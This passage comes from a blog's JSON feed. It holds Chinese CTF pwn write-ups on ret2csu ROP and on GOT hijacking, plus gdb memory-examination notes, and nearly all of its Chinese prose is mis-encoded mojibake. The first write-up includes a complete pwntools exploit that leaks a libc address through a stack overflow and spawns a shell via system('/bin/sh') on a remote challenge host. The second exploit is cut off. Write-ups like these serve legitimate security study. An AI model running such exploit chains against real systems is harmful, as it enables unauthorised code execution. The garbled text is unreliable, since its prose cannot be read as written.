çš„é«˜å››å­—èŠ‚éƒ½æ˜¯ 00ï¼Œè€Œä½å››å­—èŠ‚æ‰æ˜¯ r15 é‡Œçš„å†…å®¹ã€‚ï¼ˆä¹Ÿå°±æ˜¯è¯´å¦‚æœæƒ³ç”¨ ret2csu å»æŠŠ rdi é‡Œå­˜æ”¾æˆä¸€ä¸ªåœ°å€æ˜¯ä¸å¯è¡Œçš„ï¼‰</p>\n<p>gadget2_åæ‰§è¡Œ</p>\n<ul>\n<li>ä» 0x0000000000400600 åˆ° 0x0000000000400609ï¼Œæˆ‘ä»¬å¯ä»¥å°† r13 èµ‹ç»™ rdx, å°† r14 èµ‹ç»™ rsiï¼Œå°† r15d èµ‹ç»™ ediï¼ˆéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶è¿™é‡Œèµ‹ç»™çš„æ˜¯ ediï¼Œ<strong>ä½†å…¶å®æ­¤æ—¶ rdi çš„é«˜ 32 ä½å¯„å­˜å™¨å€¼ä¸º 0ï¼ˆè‡ªè¡Œè°ƒè¯•ï¼‰</strong>ï¼Œæ‰€ä»¥å…¶å®æˆ‘ä»¬å¯ä»¥æ§åˆ¶ rdi å¯„å­˜å™¨çš„å€¼ï¼Œåªä¸è¿‡åªèƒ½æ§åˆ¶ä½ 32 ä½ï¼‰ï¼Œè€Œè¿™ä¸‰ä¸ªå¯„å­˜å™¨ï¼Œä¹Ÿæ˜¯ x64 å‡½æ•°è°ƒç”¨ä¸­ä¼ é€’çš„å‰ä¸‰ä¸ªå¯„å­˜å™¨ã€‚æ­¤å¤–ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥åˆç†åœ°æ§åˆ¶ r12 ä¸ rbxï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨æˆ‘ä»¬æƒ³è¦è°ƒç”¨çš„å‡½æ•°ã€‚æ¯”å¦‚è¯´æˆ‘ä»¬å¯ä»¥æ§åˆ¶ rbx ä¸º 0ï¼Œr12 ä¸ºå­˜å‚¨æˆ‘ä»¬æƒ³è¦è°ƒç”¨çš„å‡½æ•°çš„åœ°å€ã€‚</li>\n</ul>\n<p>æ­¤æ—¶å¼€å§‹æ‰§è¡Œè¿™éƒ¨åˆ†ä»£ç ï¼Œè¿™æ²¡ä»€ä¹ˆå¥½è¯´çš„äº†ï¼Œå°±æ˜¯æŠŠ r13,r14,r15 çš„å€¼æ”¾å…¥ rdx,rsi,edi ä¸‰ä¸ªå¯„å­˜å™¨é‡Œé¢ã€‚</p>\n<p>ç„¶åç”±äºæˆ‘ä»¬å‰é¢çš„ rbx æ˜¯ 0ï¼ŒåŠ ä¸€ä¹‹åç­‰äºäº† rbpï¼Œå› æ­¤ jnz ä¸è·³è½¬ã€‚é‚£å°±ç»§ç»­å‘ä¸‹æ‰§è¡Œï¼Œå¦‚æœæˆ‘ä»¬ä¸Šé¢ call äº†ä¸€ä¸ªç©ºå‡½æ•°çš„è¯ï¼Œé‚£æˆ‘ä»¬å°±åˆ©ç”¨ä¸‹é¢çš„ retã€‚ç”±äºç»§ç»­å‘ä¸‹æ‰§è¡Œï¼Œå› æ­¤åˆæ¥åˆ°äº† gadget1 è¿™é‡Œã€‚</p>\n<p>å¦‚æœä¸éœ€è¦å†ä¸€æ¬¡æ§åˆ¶å‚æ•°çš„è¯ï¼Œé‚£æˆ‘ä»¬æ­¤æ—¶æŠŠæ ˆä¸­çš„æ•°æ®å¡«å…… 56ï¼ˆ7*8 ä½ æ‡‚å¾—ï¼‰ä¸ªåƒåœ¾æ•°æ®å³å¯ã€‚</p>\n<p>å¦‚æœæˆ‘ä»¬è¿˜éœ€è¦ç»§ç»­æ§åˆ¶å‚æ•°çš„è¯ï¼Œé‚£å°±æ­¤æ—¶ä¸å¡«å……åƒåœ¾æ•°æ®ï¼Œç»§ç»­å»æ§åˆ¶å‚æ•°ï¼Œæ€»ä¹‹ä¸ç®¡å¹²å•¥å‘¢ï¼Œè¿™é‡Œéƒ½è¦å‡‘é½ 56 å­—èŠ‚çš„æ•°æ®ï¼Œä»¥ä¾¿æˆ‘ä»¬æ‰§è¡Œæœ€åçš„ retï¼Œæœ€å ret å»æ‰§è¡Œæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‡½æ•°å³å¯ã€‚</p>\n<pre><code class=\"language-Python\">.text:0000000000400600                 mov     rdx, r13\n.text:0000000000400603                 mov     rsi, r14\n.text:0000000000400606                 mov     edi, r15d\n.text:0000000000400609                 call    qword ptr [r12+rbx*8]\n</code></pre>\n<ul>\n<li>ä» 0x000000000040060D åˆ° 0x0000000000400614ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶ rbx ä¸ rbp çš„ä¹‹é—´çš„å…³ç³»ä¸º rbx+1 = rbpï¼Œè¿™æ ·æˆ‘ä»¬å°±ä¸ä¼šæ‰§è¡Œ loc_400600ï¼Œè¿›è€Œå¯ä»¥ç»§ç»­æ‰§è¡Œä¸‹é¢çš„æ±‡ç¼–ç¨‹åºã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç®€å•çš„è®¾ç½® rbx=0ï¼Œrbp=1ã€‚</li>\n</ul>\n<pre><code class=\"language-Python\">.text:000000000040060D                 add     rbx, 1\n.text:0000000000400611                 cmp     rbx, rbp\n.text:0000000000400614                 jnz     short loc_400600\n</code></pre>\n<p>åšä¸€ä¸ªç¨å¾®ç®€å•ä¸€ç‚¹çš„ ret2libc é¢˜ç›®ï¼š</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3RmZXIudmlwL3Byb2JsZW0vMjk2Mw==\">é¢˜ç›®é“¾æ¥ï¼šret2csu</span></p>\n<p><img data-src=\"/img/csu/1280X1280.PNG\" alt=\"img\"></p>\n<p><img data-src=\"/img/csu/1.PNG\" alt=\"img\"></p>\n<p>å¯ä»¥çœ‹å‡ºï¼Œå’Œåˆ«çš„é¢˜æ²¡ä»€ä¹ˆç‰¹åˆ«ä¹‹å¤„ã€‚</p>\n<p><img data-src=\"/img/csu/2.PNG\" alt=\"img\"></p>\n<p><img data-src=\"/img/csu/3.PNG\" alt=\"img\"></p>\n<p>å¾ˆæ˜æ˜¾èƒ½å¤Ÿçœ‹å‡ºåœ¨ vuln å¤„çš„ read å‡½æ•°æœ‰æ ˆæº¢å‡ºæ¼æ´ã€‚pad ä¸º 0x100+8 æ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰åé—¨ï¼ˆé¢˜ç›®ç»™å‡º libc æ–‡ä»¶ï¼Œé‚£ä¹ˆä¸€èˆ¬éƒ½æ˜¯æ²¡æœ‰åé—¨çš„ï¼‰</p>\n<p><img data-src=\"/img/csu/9fb1273e-c627-4f55-9543-5703e4616f76.png\" alt=\"img\"></p>\n<p>æ²¡æœ‰ system è°ƒç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦å»å•ç‹¬æ³„éœ²å‡½æ•°çš„çœŸå®åœ°å€ï¼Œå»è®¡ç®— system åœ°å€ã€‚æˆ‘ä»¬å¯ä»¥ç”¨ ROPgadget å»çœ‹ä¸€ä¸‹æˆ‘ä»¬èƒ½ä¸èƒ½ç”¨åŸºæœ¬çš„ ROP é“¾å»æ³„éœ²åœ°å€ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥æ³„éœ² write å‡½æ•°çš„çœŸå®åœ°å€æˆ– read å‡½æ•°çš„çœŸå®åœ°å€ã€‚</p>\n<pre><code class=\"language-Python\">0x00000000004012ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n</code></pre>\n<p>æœ¬èº«æƒ³ç”¨è¿™ä¸ª gadget å»è·å–çœŸå®åœ°å€ä½†æ˜¯</p>\n<pre><code class=\"language-Python\">payload = pad + p64(pop_chain) + p64(1) + p64(write_got) + p64(8) + p64(0) + p64(write_plt) + p64(main_addr)\n</code></pre>\n<p>ä¸Šé¢æ„é€ çš„ payload å¹¶ä¸èƒ½å¾—åˆ°åœ°å€</p>\n<p>æ‰€ä»¥è€è€å®å®çš„å»ç”¨ csu å»åšè¿™ä¸ªé¢˜å§ã€‚</p>\n<p><img data-src=\"/img/csu/9812e1fa-bbb4-409c-b30b-04675e83af54.png\" alt=\"img\"></p>\n<p>gadget_1 = 0x4012AA</p>\n<p>gadget_2 = 0x401290</p>\n<p>ä½†æ˜¯è¿™é‡Œæœ‰è¶£çš„æ˜¯è·³è½¬çš„åœ°å€æ˜¯ç”¨ r15+rbx*8 æ‰€ä»¥åªéœ€è¦æ³¨æ„çš„ä¸€ç‚¹ r15 é™„åˆ°æˆ‘ä»¬æƒ³è·³è½¬åˆ°åœ°å€å°±è¡Œã€‚</p>\n<pre><code class=\"language-Python\">payload = pad \npayload += p64(gadget_1)\npayload += p64(0) # rbx\npayload += p64(1) # rbp\npayload += p64(1) # r12\npayload += p64(write_got) # r13\npayload += p64(8) # r14\npayload += p64(write_got) # r15\npayload += p64(gadget_2)\npayload += b'a'*(0x8+8*6)\npayload += p64(main_addr)\nfrom pwn import *\ncontext.log_level = 'debug'\ndebug = 0\nif debug :\n        p = process('ret2csu')\nelse:\n        p = remote('node1.anna.nssctf.cn',28119)\n\nelf = ELF('ret2csu')\n\ngadget_1 = 0x4012AA\ngadget_2 = 0x401290\nwrite_got = elf.got['write']\nwrite_plt = elf.plt['write']\nprint(hex(write_got))\nmain_addr = elf.symbols['main']\nprint(hex(main_addr))\npop_rdi = 0x04012b3\n# pop_chain = 0x00000000004012ac\nret = 0x040101a \npad = b'a'*(0x100 + 0x8)\npayload = pad \npayload += p64(gadget_1)\npayload += p64(0) # rbx\npayload += p64(1) # rbp\npayload += p64(1) # r12\npayload += p64(write_got) # r13\npayload += p64(8) # r14\npayload += p64(write_got) # r15\npayload += p64(gadget_2)\npayload += b'a'*(0x8+8*6)\npayload += p64(main_addr)\n\np.recvuntil('Input:\\n')\np.sendline(payload)\nwrite_addr = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))\n\nlibc = ELF('libc.so.6')\nbase = write_addr - libc.sym['write']\nsys = base + libc.sym['system']\nbin_sh = list(libc.search(b'/bin/sh'))[0] + base\npayload1 = pad + p64(ret) +p64(pop_rdi) + p64(bin_sh) + p64(sys)\np.recvuntil('Input:\\n')\np.sendline(payload1)\n\np.interactive()\n</code></pre>\n<h3 id=\"æ’åº-gdb-ä¸€äº›ç”¨æ³•\"><a class=\"markdownIt-Anchor\" href=\"#æ’åº-gdb-ä¸€äº›ç”¨æ³•\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JyZWV6ZV9DQVQvYXJ0aWNsZS9kZXRhaWxzLzEwMzc4OTIzMw==\">æ’åº gdb ä¸€äº›ç”¨æ³•</span></h3>\n<h4 id=\"xå‘½ä»¤\"><a class=\"markdownIt-Anchor\" href=\"#xå‘½ä»¤\">#</a> X å‘½ä»¤ï¼š</h4>\n<p>å¯ä»¥ä½¿ç”¨ examine å‘½ä»¤ (ç®€å†™æ˜¯ x) æ¥æŸ¥çœ‹å†…å­˜åœ°å€ä¸­çš„å€¼ã€‚x å‘½ä»¤çš„è¯­æ³•å¦‚ä¸‹æ‰€ç¤ºï¼š</p>\n<p>x/&lt;n/f/u&gt;</p>\n<p><strong>nã€fã€u æ˜¯å¯é€‰çš„å‚æ•°ã€‚</strong></p>\n<p>n æ˜¯ä¸€ä¸ªæ­£æ•´æ•°ï¼Œè¡¨ç¤ºéœ€è¦æ˜¾ç¤ºçš„å†…å­˜å•å…ƒçš„ä¸ªæ•°ï¼Œä¹Ÿå°±æ˜¯è¯´ä»å½“å‰åœ°å€å‘åæ˜¾ç¤ºå‡ ä¸ªå†…å­˜å•å…ƒçš„å†…å®¹ï¼Œä¸€ä¸ªå†…å­˜å•å…ƒçš„å¤§å°ç”±åé¢çš„ u å®šä¹‰ã€‚</p>\n<p>f è¡¨ç¤ºæ˜¾ç¤ºçš„æ ¼å¼ï¼Œå‚è§ä¸‹é¢ã€‚å¦‚æœåœ°å€æ‰€æŒ‡çš„æ˜¯å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæ ¼å¼å¯ä»¥æ˜¯ sï¼Œå¦‚æœåœ°åæ˜¯æŒ‡ä»¤åœ°å€ï¼Œé‚£ä¹ˆæ ¼å¼å¯ä»¥æ˜¯ iã€‚</p>\n<pre><code>x æŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚\nd æŒ‰åè¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚\nu æŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºæ— ç¬¦å·æ•´å‹ã€‚\no æŒ‰å…«è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚\nt æŒ‰äºŒè¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚\na æŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚\nc æŒ‰å­—ç¬¦æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚\nf æŒ‰æµ®ç‚¹æ•°æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚\ns æŒ‰å­—ç¬¦ä¸²æ˜¾ç¤ºã€‚\nb æŒ‰å­—ç¬¦æ˜¾ç¤ºã€‚\ni æ˜¾ç¤ºæ±‡ç¼–æŒ‡ä»¤ã€‚\n</code></pre>\n<p>u è¡¨ç¤ºä»å½“å‰åœ°å€å¾€åè¯·æ±‚çš„å­—èŠ‚æ•°ï¼Œå¦‚æœä¸æŒ‡å®šçš„è¯ï¼ŒGDB é»˜è®¤æ˜¯ 4 ä¸ª bytesã€‚u å‚æ•°å¯ä»¥ç”¨ä¸‹é¢çš„å­—ç¬¦æ¥ä»£æ›¿ï¼Œb è¡¨ç¤ºå•å­—èŠ‚ï¼Œh è¡¨ç¤ºåŒå­—èŠ‚ï¼Œw è¡¨ç¤ºå››å­— èŠ‚ï¼Œg è¡¨ç¤ºå…«å­—èŠ‚ã€‚å½“æˆ‘ä»¬æŒ‡å®šäº†å­—èŠ‚é•¿åº¦åï¼ŒGDB ä¼šä»æŒ‡å†…å­˜å®šçš„å†…å­˜åœ°å€å¼€å§‹ï¼Œè¯»å†™æŒ‡å®šå­—èŠ‚ï¼Œå¹¶æŠŠå…¶å½“ä½œä¸€ä¸ªå€¼å–å‡ºæ¥ã€‚</p>\n<p>x /10gx 0x123456 // å¸¸ç”¨ï¼Œä» 0x123456 å¼€å§‹æ¯ä¸ªå•å…ƒå…«ä¸ªå­—èŠ‚ï¼Œåå…­è¿›åˆ¶æ˜¾ç¤ºæ˜¯ä¸ªå•å…ƒçš„æ•°æ®</p>\n<p>x /10xd $rdi // ä» rdi æŒ‡å‘çš„åœ°å€å‘åæ‰“å° 10 ä¸ªå•å…ƒï¼Œæ¯ä¸ªå•å…ƒ 4 å­—èŠ‚çš„åè¿›åˆ¶æ•°</p>\n<p>x /10i 0x123456 // å¸¸ç”¨ï¼Œä» 0x123456 å¤„å‘åæ˜¾ç¤ºåæ¡æ±‡ç¼–æŒ‡ä»¤</p>\n",
            "tags": [
                "csu",
                "rop",
                "gdb"
            ]
        },
        {
            "id": "http://example.com/2023/08/03/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/",
            "url": "http://example.com/2023/08/03/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/",
            "title": "å›½èµ›å¤ç°",
            "date_published": "2023-08-03T09:17:58.000Z",
            "content_html": "<h1 id=\"å›½èµ›é¢˜å¤ç°\"><a class=\"markdownIt-Anchor\" href=\"#å›½èµ›é¢˜å¤ç°\">#</a> å›½èµ›é¢˜å¤ç°</h1>\n<p>ä¸åŒåœ°åŒºçš„å›½èµ›é¢˜ï¼Œè¿›è¡Œå¤ç°ã€‚â€” ç®€å• pwn é¢˜</p>\n<h3 id=\"ååŒ—èµ›åŒº\"><a class=\"markdownIt-Anchor\" href=\"#ååŒ—èµ›åŒº\">#</a> ååŒ—èµ›åŒºï¼š</h3>\n<h3 id=\"relroä¿æŠ¤æœºåˆ¶\"><a class=\"markdownIt-Anchor\" href=\"#relroä¿æŠ¤æœºåˆ¶\">#</a> RELRO ä¿æŠ¤æœºåˆ¶</h3>\n<p><strong>1.RELRO çš„ä¿æŠ¤æœºåˆ¶å¯ç”¨äºé˜²æŠ¤ <code>GOT hijacking</code> ï¼Œå…¶å…¨åä¸º <code>Relocation Read-Only</code> ã€‚</strong></p>\n<p><strong>2. æœ¬é¢˜ä¸­ <code>checksec</code>  ä¸­ä¸º <code>Partial RELRO</code> ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œ <code>GOT</code>  å¯å†™ï¼Œå³å­˜åœ¨ <code>GOT hijacking</code>  çš„æ¼æ´</strong></p>\n<p><strong>3. è€Œä¿æŠ¤çš„æ–¹å¼æ˜¯è®¾ç½®ä¸º <code>Full RELRO</code> ï¼Œè¿™ç§æƒ…å†µä¸‹ä¸ä¼šå‡ºç° <code>lazy binding</code> ï¼Œå› ä¸ºåœ¨ <code>Load time</code>  æ—¶ä¼šå°†æ‰€æœ‰ <code>funciton resolve</code>  å®Œæ¯•ï¼Œå¹¶è®¾ç½® <code>GOT</code>  ä¸å¯å†™ã€‚</strong></p>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717090133980.png\" alt=\"image-20230717090133980\"></p>\n<p>ç»™åˆ°çš„é™„ä»¶æ˜¯è¿™ä¸¤ä¸ªã€‚</p>\n<h5 id=\"æ£€æŸ¥ç¨‹åº\"><a class=\"markdownIt-Anchor\" href=\"#æ£€æŸ¥ç¨‹åº\">#</a> æ£€æŸ¥ç¨‹åº</h5>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717090248188.png\" alt=\"image-20230717090248188\"></p>\n<p>å¼€å¯äº†å †æ ˆä¸å¯æ‰§è¡Œå’Œ pie ä¿æŠ¤ã€‚</p>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717090403892.png\" alt=\"image-20230717090403892\"></p>\n<p>æ™®é€šçš„æ‰§è¡Œå¹¶æ²¡æœ‰å‘ç°ä»€ä¹ˆä¸œè¥¿</p>\n<h5 id=\"æ”¾å…¥ida\"><a class=\"markdownIt-Anchor\" href=\"#æ”¾å…¥ida\">#</a> æ”¾å…¥ IDA</h5>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/OLUQRFR5HLPTU%258MV3M%259%5DR.png\" alt=\"img\"></p>\n<p>è¿™æ˜¯ç»™åˆ°çš„å‡ ä¸ªå‡½æ•°</p>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717090604786.png\" alt=\"image-20230717090604786\"></p>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717090621694.png\" alt=\"image-20230717090621694\"></p>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717090637164.png\" alt=\"image-20230717090637164\"></p>\n<p>è¿™æ˜¯å…¶ä¸­æœ‰ç”¨çš„å‡½æ•°ï¼Œæ¥ä¸‹æ¥è¿›è¡Œåˆ†æ</p>\n<ol>\n<li></li>\n</ol>\n<p>å…¶ä¸­ v2 æ•°ç»„åœ¨ä»–çš„ç´¢å¼• 0 çš„ä½ç½®æœ‰ puts å‡½æ•°çš„åœ°å€ã€‚</p>\n<p>main å‡½æ•°æ˜¾ç¤ºè°ƒç”¨äº† 96B è¿™ä¸ªå‡½æ•°ï¼Œ96B å†…æœ‰ä¸ª scanf å‡½æ•°ï¼Œä»–çš„å‚æ•°æ˜¯ %252sï¼Œè¿™é‡Œè¦è®°ä½ï¼Œè¦ç”¨åˆ°ï¼Œå¾€ä¸‹çœ‹ï¼Œè¿˜æœ‰æ˜¯ sacnfï¼Œè¿™é‡Œä¸»è¦æ˜¯ç»•è¿‡åˆ¤æ–­çš„ã€‚åªè¦ç»•è¿‡è¿™ä¸ªåˆ¤æ–­ï¼Œæˆ‘ä»¬å°±èƒ½å¾—åˆ° v2 çš„ç´¢å¼• 0 å¤„çš„åœ°å€ã€‚</p>\n<p><strong>å‚æ•° % s</strong><br>\n<strong>% s å‚æ•°åœ¨ PWN é¢˜ä¸­çš„åº”ç”¨åº”è¯¥æ˜¯æœ€å¸¸è§çš„äº†ã€‚scanf (â€œ% sâ€, a) å®é™…ä¸Šä¸ gets ä¸€æ ·å±é™©ï¼Œå‡ä¸ä¼šæ£€æŸ¥ a çš„è¾¹ç•Œï¼Œå‡ºç°åœ¨é¢˜ä¸­ä¸€å®šæ˜¯ä¸€ä¸ªå¯ä»¥è¿›è¡Œæ ˆæº¢å‡ºæˆ–å †æº¢å‡ºçš„é‡ç‚¹ã€‚è¿™é‡Œæ³¨æ„å…¶ä¸ read å‡½æ•°ç›¸åŒï¼Œå¯ä»¥è¯»å– \\x00 åé¢çš„å†…å®¹ï¼Œä»…å°†æ¢è¡Œä½œä¸ºè¾“å…¥è¯»å–çš„ç»“æŸæ ‡å¿—ã€‚ä¸è¿‡è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œ% s å‚æ•°ä¼šä»¥ç©ºæ ¼ä½œä¸ºåˆ†éš”ç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœè¾“å…¥ä¸­å«æœ‰ç©ºæ ¼ï¼Œé‚£ä¹ˆç©ºæ ¼å‰åçš„å†…å®¹ä¼šè¢«åˆ†é…åˆ°ä¸åŒçš„ % s å‚æ•°ä¸­ã€‚è¿™ä¸€ç‚¹åœ¨ä½¿ç”¨ scanf è¿›è¡Œæº¢å‡ºæ—¶éœ€è¦æ³¨æ„ï¼Œå¦åˆ™å®¹æ˜“é€ æˆ ROP é“¾æ–­è£‚ç­‰é—®é¢˜ã€‚</strong></p>\n<p>é‡Œé¢ V4 æ˜¯ä¸ªå±€éƒ¨å˜é‡ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç¬¬ä¸€ä¸ª scanf æŠŠå®ƒè¦†ç›–æˆ 0ã€‚ç¬¬ä¸€ä¸ªå‡½æ•°æˆ‘ä»¬æ€è·¯æœ‰äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç¬¬äºŒä¸ªå‡½æ•°çš„æ€è·¯ã€‚</p>\n<ol start=\"2\">\n<li></li>\n</ol>\n<p>ç¬¬ä¸‰ä¸ª scanfï¼Œè¿™æ˜¯ç”¨æ¥ç»•è¿‡åˆ¤æ–­çš„ã€‚ä¸€å…±æœ‰ä¸¤ä¸ª read å‡½æ•°ï¼Œç¬¬ä¸€ä¸ª read å‡½æ•°æ²¡å•¥ç”¨ï¼Œæœ‰æ„æ€çš„å°±æ˜¯ç¬¬äºŒä¸ª read å‡½æ•°ã€‚</p>\n<pre><code>æ ˆä¸­çš„æ•°ç»„è¶Šç•Œï¼š\nå› ä¸ºæ ˆæ˜¯å‘ä¸‹å¢é•¿çš„ï¼Œåœ¨è¿›å…¥ä¸€ä¸ªå‡½æ•°ä¹‹å‰ï¼Œä¼šå…ˆæŠŠå‚æ•°å’Œä¸‹ä¸€æ­¥è¦æ‰§è¡Œçš„æŒ‡ä»¤åœ°å€ï¼ˆé€šè¿‡callå®ç°ï¼‰å‹æ ˆï¼Œåœ¨å‡½æ•°çš„å…¥å£ä¼šæŠŠebpå‹æ ˆï¼Œå¹¶æŠŠespèµ‹å€¼ç»™ebpï¼Œåœ¨å‡½æ•°è¿”å›çš„æ—¶å€™ï¼Œå°†ebpå€¼èµ‹ç»™espï¼Œpopå…ˆå‰æ ˆå†…çš„ä¸Šçº§å‡½æ•°æ ˆçš„åŸºåœ°å€ç»™ebpï¼Œæ¢å¤åŸæ ˆåŸºå€ï¼Œç„¶åæŠŠè°ƒç”¨å‡½æ•°ä¹‹å‰çš„å‹å…¥æ ˆçš„æŒ‡ä»¤åœ°å€popå‡ºæ¥ï¼ˆé€šè¿‡retå®ç°ï¼‰ã€‚\næ ˆæ˜¯ç”±é«˜å¾€ä½å¢é•¿çš„ï¼Œè€Œæ•°ç»„çš„å­˜å‚¨æ˜¯ç”±ä½ä½å¾€é«˜ä½å­˜çš„ï¼Œå¦‚æœè¶Šç•Œçš„è¯ï¼Œä¼šæŠŠå½“å‰å‡½æ•°çš„ebpå’Œä¸‹ä¸€è·³çš„æŒ‡ä»¤åœ°å€è¦†ç›–æ‰ï¼Œå¦‚æœè¦†ç›–äº†å½“å‰å‡½æ•°çš„ebpï¼Œé‚£ä¹ˆåœ¨æ¢å¤çš„æ—¶å€™espå°±ä¸èƒ½æŒ‡å‘æ­£ç¡®çš„åœ°æ–¹ï¼Œä»è€Œå¯¼è‡´æœªå¯çŸ¥çš„æƒ…å†µï¼Œå¦‚æœä¸‹ä¸€è·³çš„åœ°å€ä¹Ÿè¢«è¦†ç›–æ‰ï¼Œé‚£ä¹ˆè‚¯å®šä¼šå¯¼è‡´crashã€‚\n</code></pre>\n<p>æ‰€ä»¥é€šè¿‡ç¬¬äºŒä¸ª read å‡½æ•°ï¼Œå»æ§åˆ¶ä¿®æ”¹åœ°å€ã€‚é¦–å…ˆå°±æ˜¯å»åšåˆ°è¦†ç›–ï¼Œè¿™ç§è¦†ç›–ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡è§ï¼Œæ˜¯çœ‹ bss æ®µé‡Œå¤§å°å»è¦†ç›–ã€‚</p>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717143008203.png\" alt=\"image-20230717143008203\"></p>\n<p>è¦†ç›– 0x1c å­—èŠ‚å¤§å°ï¼Œè¦†ç›–å®Œåå»ä¿®æ”¹åœ°å€ï¼Œä½†æ˜¯å› ä¸º v0 æ˜¯é€šè¿‡ rax å»å­˜å‚çš„ï¼Œæ‰€ä»¥éœ€è¦å»ä¼ ä¸¤éå‚ï¼Œæ­£å¥½æœ‰ä¸¤æ¬¡ä¼ å‚æœºä¼šï¼Œæˆ‘ä»¬å¯ä»¥å»ä¿®æ”¹ close å‡½æ•°ï¼Œå˜æˆä¸€ä¸ªæˆ‘ä»¬æƒ³è¦å»ç¨‹åºæ‰§è¡Œçš„å‡½æ•°ã€‚</p>\n<p>è¿™é‡Œæˆ‘ä»¬è¦é‡æ–°è¿”å›æ‰§è¡Œ A31 è¿™ä¸ªå‡½æ•°ï¼Œæ¥ä¸‹æ¥å°±æ˜¯é‡å¤´æˆï¼Œå»ä¿®æ”¹ got è¡¨ã€‚</p>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717143729215.png\" alt=\"image-20230717143729215\"></p>\n<p>éå¸¸å…³é”®ä¸€ç‚¹å°±æ˜¯è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹ strlen å‡½æ•°ï¼Œå˜æˆ system å‡½æ•°ï¼Œåœ¨ç»™ä»–ä¼ ä¸ª bin/sh å³å¯</p>\n<h5 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">,</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>terminal<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'tmux'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'split'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'-h'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>local <span class=\"token operator\">=</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span> local <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    io <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    io <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xfc</span><span class=\"token 